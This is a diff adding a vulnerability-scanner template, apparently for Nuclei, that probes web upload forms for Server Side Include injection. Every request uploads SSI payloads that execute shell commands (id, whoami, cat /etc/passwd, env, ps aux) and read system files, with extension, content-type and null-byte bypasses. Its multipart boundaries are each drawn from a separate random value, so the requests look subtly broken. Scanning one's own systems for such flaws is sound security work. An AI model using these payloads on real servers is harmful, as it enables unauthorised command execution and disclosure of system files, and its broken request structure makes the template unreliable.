@@ -1,0 +1,326 @@
+id: medium-upload-server-side-include-via-upload
+
+info:
+  name: Server Side Include (SSI) via File Upload Vulnerability
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects Server Side Include (SSI) injection vulnerabilities through file upload functionality.
+    This template tests various SSI payloads, file extensions, and bypass techniques commonly
+    used by red teams to achieve remote code execution and information disclosure.
+  reference:
+    - https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection
+    - https://book.hacktricks.xyz/pentesting-web/ssi-server-side-includes-injection
+    - https://portswigger.net/web-security/server-side-template-injection
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 7.6
+    cwe-id: CWE-96
+    cpe: cpe:2.3:a:*:web_server:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 20
+    shodan-query: "Server: Apache OR Server: nginx"
+  tags: file-upload,ssi,rce,injection,bypass,elite,server-side
+
+variables:
+  filename: "{{rand_base(8)}}"
+  ssi_marker: "{{rand_text_alpha(8)}}"
+  cmd_marker: "{{rand_text_alpha(10)}}{{rand_int(1000,9999)}}{{rand_text_alpha(6)}}"
+
+http:
+  # Basic SSI injection via .shtml upload
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.shtml"
+        Content-Type: text/html
+        
+        <!--#echo var="DATE_LOCAL" -->
+        <!--#exec cmd="echo {{cmd_marker}}" -->
+        <!--#include virtual="/etc/passwd" -->
+        <!--#config timefmt="%A %B %d, %Y" -->
+        <!--#echo var="DOCUMENT_NAME" -->
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/uploads/{{filename}}.shtml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{cmd_marker}}"
+          - "root:x:0:0"
+        condition: or
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(monday|tuesday|wednesday|thursday|friday|saturday|sunday).*[0-9]{4}"
+          - "{{filename}}\\.shtml"
+
+  # Advanced SSI with multiple extensions
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.shtm"
+        Content-Type: text/html
+        
+        <html>
+        <body>
+        <!--#set var="test" value="{{ssi_marker}}" -->
+        <!--#echo var="test" -->
+        <!--#exec cmd="id" -->
+        <!--#exec cmd="whoami" -->
+        <!--#exec cmd="uname -a" -->
+        </body>
+        </html>
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/{{filename}}.shtm HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{ssi_marker}}"
+          - "uid="
+          - "gid="
+        condition: or
+
+  # SSI with .stm extension
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.stm"
+        Content-Type: text/html
+        
+        <!--#printenv -->
+        <!--#exec cmd="cat /etc/passwd" -->
+        <!--#include file="/proc/version" -->
+        <!--#flastmod file="{{filename}}.stm" -->
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/uploads/{{filename}}.stm HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(PATH|HOME|USER)="
+          - "root:x:0:0"
+          - "Linux.*version"
+
+  # Double extension bypass
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.html.shtml"
+        Content-Type: text/html
+        
+        <!DOCTYPE html>
+        <html>
+        <head><title>Test</title></head>
+        <body>
+        <!--#exec cmd="echo 'SSI_BYPASS_SUCCESS_{{rand_int(10000,99999)}}'" -->
+        <!--#config errmsg="[SSI Error]" -->
+        <!--#include virtual="/etc/hosts" -->
+        </body>
+        </html>
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/{{filename}}.html.shtml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "SSI_BYPASS_SUCCESS_[0-9]+"
+          - "127\\.0\\.0\\.1.*localhost"
+
+  # Content-Type bypass with SSI
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt"
+        Content-Type: text/x-server-parsed-html
+        
+        Normal text file content
+        <!--#echo var="SERVER_NAME" -->
+        <!--#exec cmd="ps aux | head -5" -->
+        <!--#include virtual="/proc/cpuinfo" -->
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/uploads/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(apache|nginx|iis)"
+          - "PID.*CMD"
+          - "processor.*:"
+
+  # Advanced SSI with file inclusion
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.inc"
+        Content-Type: text/html
+        
+        <!--#set var="cmd" value="cat /etc/passwd" -->
+        <!--#exec cmd="$cmd" -->
+        <!--#if expr="${QUERY_STRING} = /test/" -->
+        <!--#exec cmd="ls -la /" -->
+        <!--#endif -->
+        <!--#include virtual="../../../etc/passwd" -->
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/{{filename}}.inc?test HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0"
+          - "bin:x:1:1"
+          - "daemon:x:2:2"
+        condition: or
+
+  # SSI with environment variable disclosure
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.ssi"
+        Content-Type: text/html
+        
+        <pre>
+        Server: <!--#echo var="SERVER_SOFTWARE" -->
+        Document Root: <!--#echo var="DOCUMENT_ROOT" -->
+        Script Name: <!--#echo var="SCRIPT_NAME" -->
+        Remote Address: <!--#echo var="REMOTE_ADDR" -->
+        <!--#exec cmd="env | grep -E '(PATH|HOME|USER|PWD)'" -->
+        </pre>
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/uploads/{{filename}}.ssi HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Server: (Apache|nginx|IIS)"
+          - "Document Root: /"
+          - "(PATH|HOME|USER)="
+
+  # Null byte injection with SSI
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.txt%00.shtml"
+        Content-Type: text/plain
+        
+        Innocent text file
+        <!--#exec cmd="echo 'NULL_BYTE_SSI_{{rand_text_alpha(8)}}'" -->
+        <!--#include virtual="/etc/passwd" -->
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/{{filename}}.txt%00.shtml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "NULL_BYTE_SSI_[a-zA-Z]{8}"
+          - "root:x:0:0"
+
+  # SSI with command chaining
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rand_text_alpha(16)}}
+        
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.html"
+        Content-Type: text/html
+        
+        <html>
+        <body>
+        <!--#exec cmd="echo 'CHAIN_START' && whoami && echo 'CHAIN_END'" -->
+        <!--#exec cmd="id; uname -a; echo 'SSI_CHAIN_SUCCESS'" -->
+        <!--#exec cmd="ls -la /tmp | head -3" -->
+        </body>
+        </html>
+        ------WebKitFormBoundary{{rand_text_alpha(16)}}--
+
+      - |
+        GET {{path}}/uploads/{{filename}}.html HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "CHAIN_START"
+          - "CHAIN_END"
+          - "SSI_CHAIN_SUCCESS"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'uid=([0-9]+)'
+          - 'Server: ([^\\r\\n]+)'
+          - 'Document Root: ([^\\r\\n]+)'
